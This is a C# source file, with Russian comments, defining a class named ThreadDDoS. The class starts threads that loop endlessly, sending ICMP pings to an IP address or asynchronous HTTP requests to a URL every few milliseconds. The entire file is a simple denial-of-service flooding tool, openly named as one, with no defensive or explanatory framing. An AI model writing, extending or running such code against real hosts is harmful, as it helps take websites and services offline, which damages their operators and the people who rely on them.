using System;
using System.Threading;
using System.Net;


namespace md.sys
{
    class ThreadDDoS
    {
        public static uint CountThread = 0;
        public static uint CountReq = 0;

        public static bool isClearMemory = true;


        public Thread Thread;     
        public int TimeOut { get; set; }

        public IPAddress IP { set; get; }
        public Boolean IsIP { get; set; }
        public string Url { get; set; }


        public ThreadDDoS(string url, int timeOut = 10, string name = null, bool isAutoStart = true)
        {
            this.Init(timeOut, name, isAutoStart);

            this.Url = url;
            this.IsIP = false;
        }

        public ThreadDDoS(IPAddress IP, int timeOut = 10, string name = null, bool isAutoStart = true)
        {
            this.Init(timeOut, name, isAutoStart);

            this.IP = IP;
            this.IsIP = true;
        }

        private void Init(int timeOut = 10, string name = null, bool isAutoStart = true)
        {
            CountThread++;
            this.TimeOut = timeOut;
            Thread = new Thread(this.FuncThread);
            if (name == null) Thread.Name = "thread-" + CountThread.ToString();
            else Thread.Name = name;
            if (isAutoStart) Thread.Start();
        }
        
        private void FuncThread()
        {
            while (true)
            {
                Thread.Sleep(TimeOut);
                CountReq++;

                if (IsIP)
                {
                    var ping = new System.Net.NetworkInformation.Ping();
                    //Если IP пропарсился нормально, то пингуем
                    if (this.IP != null)
                        ping.Send(this.IP);
                }
                else
                {
                    //Создаём запрос
                    var r = (HttpWebRequest)WebRequest.Create(this.Url);
                    //Начинаем слушать ответ
                    r.BeginGetResponse(new AsyncCallback((IAsyncResult res) => { }), null);

                    r = null;
                    if (isClearMemory) GC.Collect();
                }

                //Console.WriteLine(CountReq);
                if (CountReq % 10000 == 0) GC.Collect();
            }
        }


    }
}
